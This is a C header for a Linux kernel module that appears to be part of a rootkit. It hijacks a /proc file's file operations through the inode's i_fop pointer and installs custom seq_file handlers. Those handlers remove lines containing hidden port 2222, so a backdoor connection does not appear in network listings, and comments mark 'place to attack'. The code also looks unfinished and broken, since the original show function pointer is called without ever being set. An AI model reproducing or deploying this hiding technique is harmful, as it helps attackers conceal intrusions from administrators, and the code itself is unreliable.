#ifndef HIDE_PROC_NET_H
#define HIDE_PROC_NET_H
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <linux/sched.h>
#include <linux/kmod.h>
#include <net/udp.h>
#include <net/tcp.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#define SECRET_PORT 2222
int (*origin_seq_show)(struct seq_file *f_seq, void *v);
/*static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos);
static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos);
static void ct_seq_stop(struct seq_file *f_seq, void *v);
static int ct_seq_show(struct seq_file *f_seq, void *v);
int ct_open(struct inode *inode, struct file *file);*/


static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos)
{
    loff_t *spos = kmalloc(sizeof(loff_t), GFP_KERNEL);
    if(!spos)
        return  NULL;
    *spos = *pos;
    return spos;
}
static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos)
{
    loff_t *spos = v;
    *pos = ++*spos;
    return spos;
}
static void ct_seq_stop(struct seq_file *f_seq, void *v)
{
    kfree(v);
}
static int ct_seq_show(struct seq_file *f_seq, void *v)
{

    char needle [ 150 ];
    loff_t *spos = v;
    int ret;
    printk(KERN_ALERT "used the seq_show");

    ret = origin_seq_show(f_seq, v);
    //need to add here call to real show
    // The start of the record = the start of the buffer + the amount already-the size of each record.
    snprintf ( needle , 150 , ":%04X" , SECRET_PORT );
    if (strnstr(f_seq->buf + f_seq->count -150, needle, 150))
    {
        printk(KERN_ALERT "found:  %d ", SECRET_PORT);
        f_seq->count -=150;//decrese the count by 150 (equal to line) 
        //remove
    }
    seq_printf(f_seq, "%lld\n", (long long)*spos);/* <---- place to attack! ---->*/
    return 0;
}
struct seq_operations seq_ops = {
    .start = ct_seq_start,
    .next = ct_seq_next,    
    .stop = ct_seq_stop,   
    .show = ct_seq_show    /*  <----postion to attack---->      */
};

int ct_open(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "used the ct_open");
    return seq_open(file , &seq_ops);
}
/*static const struct file_operations *fops = {
    .owner = THIS_MODULE,
    .open = ct_open,

}*/



struct file_operations *org_fops, proc_fops;  
struct inode *proc_inode;
struct file *file;                                                         
struct path p; 
int set_ops(char *path)
{
    
    if(kern_path(path, 0, &p))
            return 0;
    printk(KERN_ALERT "open file secessfully");
        //get the inode
    proc_inode = p.dentry->d_inode;
    printk(KERN_ALERT "got the inode");

        //get a copy of fop from inode

    proc_fops = *proc_inode->i_fop;
    printk(KERN_ALERT "got the fops");
    org_fops = proc_inode->i_fop;

    proc_fops.open = ct_open;

        //backup the fop

    printk(KERN_ALERT "save the org fops");

    proc_inode->i_fop = &proc_fops;
    printk(KERN_ALERT "hook the org fops");


    return 1;
}
void hook_seq(void)
 {     
                                    
    //proc_fops->open = ct_open;
    printk(KERN_ALERT "hooked!");

    //ern_path(path, 0, p);                                         
    //entry = PDE(p->dentry->d_inode);
    //org_fops = entry->proc_dir_fops; 
    //origin_seq_show = origin_seq_ops.show;                                      
    //PDE_DATA(p->dentry->d_inode)->seq_ops= seq_ops;                                       
 } 
 void unhook_seq(void)
 {
     proc_inode->i_fop = org_fops;
     printk(KERN_ALERT "unhooked!");
 }            
 
                                                  
#endif